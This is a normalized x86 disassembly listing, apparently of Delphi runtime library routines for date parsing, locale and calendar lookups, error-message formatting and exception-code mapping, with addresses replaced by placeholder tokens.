mov eax [ ebp - 0x8 ]
push eax
mov cx [ ebp - 0x14 ]
mov dx [ ebp - 0x12 ]
mov eax edi
call sub_409678
mov [ ebp - 0x9 ] al
mov edx [ rw-data ]
mov eax r-xdata
call sub_404654
test eax eax
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a614
mov edx ebx
mov eax esi
call sub_40a4d0
cmp [ rw-data ] 0x0
je r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
je r-xdata
mov eax [ rw-data ]
mov al [ eax ]
add al 0xd0
sub al 0xa
jae r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_404310
cmp eax [ ebx ]
jl r-xdata
mov edx ebx
mov eax esi
call sub_40a698
jmp r-xdata
cmp [ ebp - 0x18 ] 0x2
ja r-xdata
push ebp
movzx eax di
call sub_40a734
pop ecx
mov edi eax
jmp r-xdata
mov di [ ebp - 0xc ]
mov al [ ebp - 0x15 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40a4d0
mov eax esi
call sub_404310
cmp eax [ ebx ]
jl r-xdata
mov eax [ ebx ]
cmp [ esi + eax - 0x1 ] 0x20
jne r-xdata
call sub_4098d4
movzx ecx ax
movzx eax [ rw-data ]
sub ecx eax
mov eax ecx
push ecx
mov ecx 0x64
cdq
idiv ecx
pop ecx
imul ax ax 0x64
add di ax
cmp [ rw-data ] 0x0
jbe r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ rw-data ]
call sub_404310
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_404570
mov edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_407da4
test eax eax
je r-xdata
inc [ ebx ]
movzx eax di
cmp ecx eax
jle r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
call sub_404310
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_404570
mov edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_407da4
test eax eax
jne r-xdata
add di 0x64
jmp r-xdata
sub_40aad4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov esi edx
mov ebp eax
xor ebx ebx
or edi 0xffffffff
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a588
test al al
jne r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a588
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a588
test al al
jne r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax ebp
call sub_40a4f4
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a4d0
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a588
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x6 ] 0x0
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xa ] 0x0
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a614
test al al
je r-xdata
test edi edi
jge r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xa ]
mov edx esi
mov eax ebp
call sub_40a4f4
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a588
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a614
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a4d0
mov ax [ esp + 0xa ]
push eax
mov eax [ esp + 0x4 ]
push eax
mov cx [ esp + 0x10 ]
mov dx [ esp + 0xe ]
mov ax [ esp + 0xc ]
call sub_409570
mov ebx eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a588
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xc ]
mov edx esi
mov eax ebp
call sub_40a4f4
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
ja r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a588
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a614
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
jne r-xdata
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a588
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xe ]
mov edx esi
mov eax ebp
call sub_40a4f4
test al al
je r-xdata
add [ esp + 0x4 ] di
mov [ esp + 0x4 ] 0x0
sub_40acc8
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40aad4
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_404310
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40acfc
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x1
xor eax eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax esi
call sub_40a790
test al al
je r-xdata
mov edx edi
mov eax esi
call sub_40acc8
mov ebx eax
jmp r-xdata
mov eax esi
call sub_404310
cmp eax [ esp ]
jl r-xdata
mov eax ebx
add esp 0x18
pop edi
pop esi
pop ebx
retn
fld [ esp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
lea ecx [ esp + 0x10 ]
mov edx esp
mov eax esi
call sub_40aad4
test al al
jne r-xdata
fld [ esp + 0x8 ]
fsub [ esp + 0x10 ]
fstp [ edi ]
fwait
fld [ esp + 0x8 ]
fadd [ esp + 0x10 ]
fstp [ edi ]
fwait
jmp r-xdata
sub_40ad88
push ebx
add esp 0xffffff00
mov ebx edx
push 0x0
push 0x100
lea edx [ esp + 0x8 ]
push edx
push 0x0
push eax
push 0x0
push 0x3200
call FormatMessageA
jmp r-xdata
test eax eax
jle r-xdata
mov edx esp
mov ecx ebx
xchg ecx eax
call sub_404140
add esp 0x100
pop ebx
retn
mov dl [ esp + eax - 0x1 ]
sub dl 0x21
jb r-xdata
dec eax
sub dl 0xd
je r-xdata
sub_40add4
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov esi ecx
mov ebx [ ebp + 0x8 ]
push 0x100
lea ecx [ ebp - 0x100 ]
push ecx
push edx
push eax
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov edx esi
call sub_4040a4
mov ecx eax
dec ecx
lea edx [ ebp - 0x100 ]
mov eax ebx
call sub_404140
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40ae20
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov esi edx
mov edi eax
push 0x2
lea eax [ esp + 0x4 ]
push eax
push esi
push edi
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov al [ esp ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_40ae48
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push ebx
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx esi
call sub_40add4
cmp [ ebx ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx ebx
call sub_405b50
sub_40ae84
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_40af97
push [ fs : eax ]
mov [ fs : eax ] esp
call GetThreadLocale
mov [ ebp - 0x4 ] eax
mov ebx 0x1
mov esi rw-data
mov edi rw-data
push ebp
push 0xb
lea eax [ ebp - 0xc ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x44 ]
dec eax
call sub_40ae48
pop ecx
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4040a4
push ebp
push 0xb
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x38 ]
dec eax
call sub_40ae48
pop ecx
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_4040a4
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0xd
jne r-xdata
mov ebx 0x1
mov esi rw-data
mov edi rw-data
lea eax [ ebx + 0x5 ]
mov ecx 0x7
cdq
idiv ecx
mov [ ebp - 0x8 ] edx
push ebp
push 0x6
lea eax [ ebp - 0x14 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x31
call sub_40ae48
pop ecx
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4040a4
push ebp
push 0x6
lea eax [ ebp - 0x18 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x2a
call sub_40ae48
pop ecx
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_4040a4
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0x8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40af9e
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_404074
retn
sub_40afa8
push ebp
mov ebp esp
push ebx
push esi
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0x0
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebx * 4 + rw-data ]
mov edx [ ebp + 0x8 ]
call sub_404248
mov esi 0x1
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
inc ebx
sub_40afe4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_40b049
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0xffffffff
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404248
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_4080c0
mov [ ebx * 4 + rw-data ] eax
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b050
lea eax [ ebp - 0x4 ]
call sub_404050
retn
inc ebx
sub_40b05c
push ebp
mov ebp esp
push 0x0
push esi
xor eax eax
push ebp
push sub_40b0f3
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x100b
call sub_40add4
mov eax [ ebp - 0x4 ]
mov edx 0x1
call sub_4080c0
mov esi eax
mov eax esi
add eax 0xfffffffd
sub eax 0x3
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b0fa
lea eax [ ebp - 0x4 ]
call sub_404050
retn
push 0x4
push esi
call GetThreadLocale
push eax
push sub_40afa8
call EnumCalendarInfoA
mov edx 0x7
mov eax rw-data
mov [ eax ] 0xffffffff
add eax 0x4
dec edx
jne r-xdata
push 0x3
push esi
call GetThreadLocale
push eax
push sub_40afe4
call EnumCalendarInfoA
sub_40b10c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_40b2d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x1
mov eax edi
call sub_404050
lea eax [ ebp - 0x8 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x1009
call sub_40add4
mov eax [ ebp - 0x8 ]
mov edx 0x1
call sub_4080c0
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov eax esi
call sub_404310
cmp ebx eax
jle r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b2dd
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_404074
retn
mov al 0x1
add eax 0xfffffff3
sub eax 0x2
jb r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_408774
test eax eax
jne r-xdata
mov edx ebx
mov eax esi
call sub_40c17c
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
call sub_404570
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_404318
add ebx [ ebp - 0x4 ]
jmp r-xdata
mov eax edi
mov edx esi
call sub_4040a4
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x4
call sub_408774
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_404318
inc ebx
jmp r-xdata
mov eax esi
call sub_404310
cmp ebx eax
jle r-xdata
test al al
je r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_408774
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_404318
add ebx 0x3
jmp r-xdata
inc ebx
mov al [ esi + ebx - 0x1 ]
sub al 0x47
je r-xdata
jmp r-xdata
mov al [ esi + ebx - 0x1 ]
sub al 0x59
je r-xdata
mov eax edi
mov edx r-xdata
call sub_404318
inc ebx
jmp r-xdata
inc ebx
sub al 0x20
je r-xdata
mov eax edi
mov edx r-xdata
call sub_404318
jmp r-xdata
sub al 0x20
jne r-xdata
lea eax [ ebp - 0xc ]
mov dl [ esi + ebx - 0x1 ]
call sub_404238
mov edx [ ebp - 0xc ]
mov eax edi
call sub_404318
lea eax [ ebp - 0x14 ]
mov dl [ esi + ebx - 0x1 ]
call sub_404238
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_404318
sub_40b340
push ebp
mov ebp esp
add esp 0xfffffba8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
push 0x1c
lea eax [ ebp - 0x330 ]
push eax
push ebx
call VirtualQuery
cmp [ ebp - 0x320 ] 0x1000
jne r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ rw-data ]
push eax
call GetModuleFileNameA
mov eax ebx
call sub_40b334
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ ebp - 0x32c ]
push eax
call GetModuleFileNameA
test eax eax
jne r-xdata
lea eax [ ebp - 0x212 ]
mov dl 0x5c
call sub_40c384
mov edx eax
inc edx
lea eax [ ebp - 0x10d ]
mov ecx 0x104
call sub_408698
mov ebx r-xdata
mov edi r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
sub ebx [ ebp - 0x32c ]
mov [ ebp - 0x8 ] ebx
push 0x100
lea eax [ ebp - 0x312 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_4050bc
push eax
call LoadStringA
lea edx [ ebp - 0x458 ]
mov eax [ esi ]
call sub_4031e4
lea eax [ ebp - 0x458 ]
mov [ ebp - 0x358 ] eax
mov [ ebp - 0x354 ] 0x4
lea eax [ ebp - 0x10d ]
mov [ ebp - 0x350 ] eax
mov [ ebp - 0x34c ] 0x6
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x348 ] eax
mov [ ebp - 0x344 ] 0x5
mov [ ebp - 0x340 ] ebx
mov [ ebp - 0x33c ] 0x6
mov [ ebp - 0x338 ] edi
mov [ ebp - 0x334 ] 0x6
lea eax [ ebp - 0x358 ]
push eax
push 0x4
lea ecx [ ebp - 0x312 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408cd0
mov eax [ ebp - 0x4 ]
call sub_408608
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x4 ]
call sub_404510
mov ebx eax
mov eax ebx
call sub_408608
test eax eax
je r-xdata
cmp [ ebx + eax - 0x1 ] 0x2e
je r-xdata
mov edi r-xdata
sub_40b4c8
add esp 0xfffffbbc
push 0x400
lea ecx [ esp + 0x48 ]
call sub_40b340
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x40
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_4050bc
push eax
call LoadStringA
push 0x2010
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x4c ]
push eax
push 0x0
call MessageBoxA
mov eax [ rw-data ]
call sub_402af4
call sub_40284c
lea eax [ esp + 0x44 ]
push eax
lea eax [ esp + 0x48 ]
push eax
call CharToOemA
push 0x0
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4c ]
call sub_408608
push eax
lea eax [ esp + 0x50 ]
push eax
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
jmp r-xdata
add esp 0x444
retn
sub_40b590
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_4040a4
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_40b5cc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40b626
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_408d10
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_4040a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b62d
lea eax [ ebp - 0x4 ]
call sub_404050
retn
add esp 0xfffffff0
call sub_4035a0
sub_40b62d
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_40b64c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea edx [ edi + 0x4 ]
mov eax esi
call sub_405b50
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_40b688
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40b6f4
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_405b50
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_408d10
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_4040a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b6fb
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404074
retn
add esp 0xfffffff0
call sub_4035a0
sub_40b6fb
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_40b748
push ebx
push esi
add esp 0xfffffff8
xor ebx ebx
call sub_4028c0
mov esi eax
jmp r-xdata
cmp ebx 0x6
jg r-xdata
cmp ebx 0x6
jg r-xdata
cmp esi [ ebx * 8 + rw-data ]
jne r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b688
mov ecx [ ebx * 8 + rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
jmp r-xdata
inc ebx
mov [ eax + 0xc ] esi
pop ecx
pop edx
pop esi
pop ebx
retn
sub_40b7a8
lodsb [ esi ]
mov bh 0x40
add [ esi ] cl
or dl [ ebp + eax * 2 + 0x78 ]
arpl [ ebp + 0x70 ] sp
je r-xdata
pop es
arpl [ gs : eax ] cx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] ch
add [ eax ] al
push ebx
mov ebx edx
mov edx eax
dec dl
je r-xdata
mov edx [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
push ebx
mov eax edx
jmp sub_403a08
mov edx [ rw-data ]
jmp r-xdata
dec edx
sub dl 0x16
jb r-xdata
and eax 0xff
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b590
mov edx eax
jmp r-xdata
jmp r-xdata
call sub_40b748
mov edx eax
sub_40b81c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40b8b8
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b50
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4040e8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5cc
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b8bf
lea eax [ ebp - 0x20 ]
call sub_404050
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_40b90c
mov eax [ eax ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0x6
retn
cmp eax 0xc000008e
jg r-xdata
mov al 0xe
retn
sub eax 0x3d
je r-xdata
mov al 0xc
retn
sub eax 0xc0000093
je r-xdata
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd
retn
jmp r-xdata
mov al 0x9
retn
dec eax
je r-xdata
je r-xdata
mov al 0x7
retn
sub eax 0xc0000005
je r-xdata
mov al 0x16
retn
mov al 0x3
retn
dec eax
je r-xdata
mov al 0x8
retn
jmp r-xdata
mov al 0xb
retn
sub eax 0x87
je r-xdata
mov al 0x5
retn
jmp r-xdata
mov al 0x4
retn
dec eax
je r-xdata
jmp r-xdata
sub_40b9a4
push ebp
mov ebp esp
add esp 0xfffffe90
push ebx
push esi
xor eax eax
mov [ ebp - 0x170 ] eax
mov [ ebp - 0x14c ] eax
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x150 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40bb5f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b50
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b50
jmp r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x168 ] 0x5
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x164 ] eax
mov [ ebp - 0x160 ] 0xb
mov [ ebp - 0x15c ] esi
mov [ ebp - 0x158 ] 0x5
lea eax [ ebp - 0x16c ]
push eax
push 0x2
lea edx [ ebp - 0x170 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x170 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5cc
mov ebx eax
push 0x105
lea eax [ ebp - 0x125 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetModuleFileNameA
test eax eax
je r-xdata
mov esi [ ebx + 0x18 ]
push 0x1c
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call VirtualQuery
cmp [ ebp - 0x10 ] 0x1000
jne r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x144 ] 0x5
lea eax [ ebp - 0x150 ]
lea edx [ ebp - 0x125 ]
mov ecx 0x105
call sub_4042c0
mov eax [ ebp - 0x150 ]
lea edx [ ebp - 0x14c ]
call sub_4084d8
mov eax [ ebp - 0x14c ]
mov [ ebp - 0x140 ] eax
mov [ ebp - 0x13c ] 0xb
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x138 ] eax
mov [ ebp - 0x134 ] 0xb
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x12c ] 0x5
lea eax [ ebp - 0x148 ]
push eax
push 0x3
lea edx [ ebp - 0x154 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x154 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5cc
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bb66
lea eax [ ebp - 0x170 ]
call sub_404050
lea eax [ ebp - 0x154 ]
mov edx 0x3
call sub_404074
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_40bb70
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40bc2b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40b90c
and eax 0xff
mov edx eax
add edx 0xfffffffd
sub edx 0x8
jb r-xdata
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b590
mov ebx eax
jmp r-xdata
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
push ebp
call sub_40b9a4
pop ecx
mov ebx eax
jmp r-xdata
dec edx
sub edx 0xa
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bc32
lea eax [ ebp - 0x10 ]
call sub_404050
retn
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5cc
mov ebx eax
sub_40bc4c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b64c
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b64c
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_40bc3c
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov [ eax ] sub_40b98c
mov eax [ rw-data ]
mov [ eax ] sub_40bb70
mov eax sub_40b8d8
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40b8f4
mov edx [ rw-data ]
mov [ edx ] eax
retn
sub_40bcd0
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx - 0x8 ]
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
